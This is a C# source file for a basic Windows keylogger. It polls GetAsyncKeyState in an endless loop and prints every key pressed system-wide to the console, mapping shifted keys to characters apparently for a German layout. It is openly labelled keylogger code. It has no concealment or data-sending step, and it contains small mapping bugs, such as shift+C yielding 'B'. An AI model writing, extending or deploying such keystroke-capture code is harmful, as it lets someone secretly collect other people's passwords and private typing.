using System;
using System.Runtime.InteropServices;

namespace KeyLogger
{
    class Program
    {
        [DllImport("user32.dll")]
        public static extern Int16 GetAsyncKeyState(Int32 i);

        static void Main(string[] args)
        {
            Int16 keyDown = 0x1;

            while (true)
            {
                int isShiftPressed = GetAsyncKeyState(16);

                for (int i = 32; i < 111; i++)
                {
                    Int16 key = GetAsyncKeyState(i);
                    if((key & keyDown) == keyDown)
                    {
                        Console.Write(verifyKey(i, isShiftPressed != 0) + " | ");
                    }
                }
            }
        }

        static private String verifyKey(int code, bool shift)
        {
            String key = "";

            if (code == 32) key = " ";
            else if (code == 33) key = "[Page Up]";
            else if (code == 34) key = "[Page Down]";
            else if (code == 35) key = "[End]";
            else if (code == 36) key = "[Home]";
            else if (code == 37) key = "Left]";
            else if (code == 38) key = "[Up]";
            else if (code == 39) key = "[Right]";
            else if (code == 40) key = "[Down]";
            else if (code == 44) key = "[Print Screen]";
            else if (code == 45) key = "[Insert]";
            else if (code == 46) key = "[Delete]";
            else if (code == 48) key = shift ? "?" : "0";
            else if (code == 49) key = shift ? "!" : "1";
            else if (code == 50) key = shift ? "\u0022" : "2";
            else if (code == 51) key = shift ? "§" : "3";
            else if (code == 52) key = shift ? "$" : "4";
            else if (code == 53) key = shift ? "%" : "5";
            else if (code == 54) key = shift ? "&" : "6";
            else if (code == 55) key = shift ? "/" : "7";
            else if (code == 56) key = shift ? "(" : "8";
            else if (code == 57) key = shift ? ")" : "9";
            else if (code == 65) key = shift ? "A" : "a";
            else if (code == 66) key = shift ? "B" : "b";
            else if (code == 67) key = shift ? "B" : "c";
            else if (code == 68) key = shift ? "D" : "d";
            else if (code == 69) key = shift ? "E" : "e";
            else if (code == 70) key = shift ? "F" : "f";
            else if (code == 71) key = shift ? "G" : "g";
            else if (code == 72) key = shift ? "H" : "h";
            else if (code == 73) key = shift ? "I" : "i";
            else if (code == 74) key = shift ? "J" : "j";
            else if (code == 75) key = shift ? "K" : "k";
            else if (code == 76) key = shift ? "L" : "l";
            else if (code == 77) key = shift ? "M" : "m";
            else if (code == 78) key = shift ? "N" : "n";
            else if (code == 79) key = shift ? "O" : "o";
            else if (code == 80) key = shift ? "P" : "p";
            else if (code == 81) key = shift ? "Q" : "q";
            else if (code == 82) key = shift ? "R" : "r";
            else if (code == 83) key = shift ? "S" : "s";
            else if (code == 84) key = shift ? "T" : "t";
            else if (code == 85) key = shift ? "U" : "u";
            else if (code == 86) key = shift ? "V" : "v";
            else if (code == 87) key = shift ? "W" : "w";
            else if (code == 88) key = shift ? "X" : "x";
            else if (code == 89) key = shift ? "Y" : "y";
            else if (code == 90) key = shift ? "Z" : "z";
            else if (code == 91) key = "[Windows]";
            else if (code == 92) key = "[Windows]";
            else if (code == 93) key = "[List]";
            else if (code == 96) key = "0";
            else if (code == 97) key = "1";
            else if (code == 98) key = "2";
            else if (code == 99) key = "3";
            else if (code == 100) key = "4";
            else if (code == 101) key = "5";
            else if (code == 102) key = "6";
            else if (code == 103) key = "7";
            else if (code == 104) key = "8";
            else if (code == 105) key = "9";
            else if (code == 106) key = "*";
            else if (code == 107) key = "+";
            else if (code == 109) key = "-";
            else if (code == 110) key = ",";
            else if (code == 111) key = "/";
            else key = "[" + code + "]";

            return key;
        }
    }
}
